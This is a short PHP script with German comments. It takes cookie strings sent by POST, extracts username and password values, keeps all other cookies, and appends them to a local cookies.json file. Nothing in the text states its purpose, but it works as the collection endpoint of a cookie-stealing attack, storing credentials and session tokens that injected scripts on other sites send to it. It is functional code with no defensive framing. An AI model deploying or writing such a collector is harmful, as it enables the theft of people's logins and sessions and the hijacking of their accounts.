<?php
// Stellen Sie sicher, dass Daten empfangen wurden
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  // Überprüfen Sie, ob bestimmte Daten gesendet wurden
  if (isset($_POST['cookies'])) {
    // Zugriff auf die gesendeten Daten
    $cookieString = $_POST['cookies'];

    // Splitte den Cookie-String
    $cookiePairs = explode('; ', $cookieString);

    // Initialisierung der Variablen
    $username = "";
    $password = "";
    $extras = [];

    // Durchlaufe die Cookies
    foreach ($cookiePairs as $cookiePair) {
      list($key, $value) = explode('=', $cookiePair, 2);

      // Prüfe, ob es sich um den Benutzernamen oder das Passwort handelt
      if ($key === "username") {
        $username = $value;
      } elseif ($key === "password") {
        $password = $value;
      } else {
        // Alles andere wird in das Extras-Array eingefügt
        $extras[$key] = $value;
      }
    }

    // Erstelle das JSON-Objekt
    $jsonData = [
      "username" => $username,
      "password" => $password,
      "extras" => $extras
    ];

    // Lese den aktuellen Inhalt der Datei
    $fileContent = file_get_contents("cookies.json");
    // Dekodiere das JSON-Array
    $existingData = json_decode($fileContent, true);

    // Füge das neue Datenobjekt hinzu
    $existingData[] = $jsonData;

    // Schreibe das aktualisierte JSON-Array zurück in die Datei
    file_put_contents("cookies.json", json_encode($existingData));

    // Bestätigung an den Client senden
    echo "Daten erfolgreich empfangen und gespeichert.";
  } else {
    // Wenn erforderliche Daten nicht gesendet wurden, eine Fehlermeldung senden
    http_response_code(400);
    echo "Fehlende Daten.";
  }
} else {
  // Wenn kein POST-Request erhalten wurde, eine Fehlermeldung senden
  http_response_code(405);
  echo "Nur POST-Anfragen sind erlaubt.";
}
?>